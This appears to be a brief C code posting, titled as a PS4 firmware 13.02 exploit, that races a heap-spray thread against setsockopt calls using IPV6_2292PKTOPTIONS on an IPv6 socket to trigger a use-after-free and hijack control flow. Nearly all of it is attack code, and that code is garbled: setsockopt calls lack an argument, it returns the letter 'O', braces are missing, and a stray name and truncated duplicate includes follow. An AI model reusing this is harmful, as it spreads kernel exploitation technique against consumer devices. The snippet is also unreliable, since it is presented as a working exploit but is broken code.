# Ps-4-13.02-cods-
#include <sys/types.h>

#include <sys/socket.h>

#include <netinet/in.h>

#include <netinet/ip6.h>

#include <pthread.h>

#include <unistd.h>

#include <stdlib.h>

int g_sock;

void* spray_thread(void* arg) { while(1) {

// Spraying the heap to reclaim freed memory

setsockopt(g_sock,

IPV6_2292PKTOPTIONS, NULL, 0);

}

}

int main() { pthread_t t; g_sock = socket(AF_INET6, SOCK_STREAM, 0);

if (g_sock < 0) return 1;

pthread_create(&t, NULL, spray_thread, NULL);

while(1) {

char buffer[1024];

// Attempting to trigger the UAF and redirect control flow

setsockopt(g_sock, IPV6_2292PKTOPTIONS, buffer,

sizeof(buffer));

return O;

David #include <sys/types.h> #include <sys/socket.h> #include <netinet/in.h> #include <netinet/ip6.h> #include
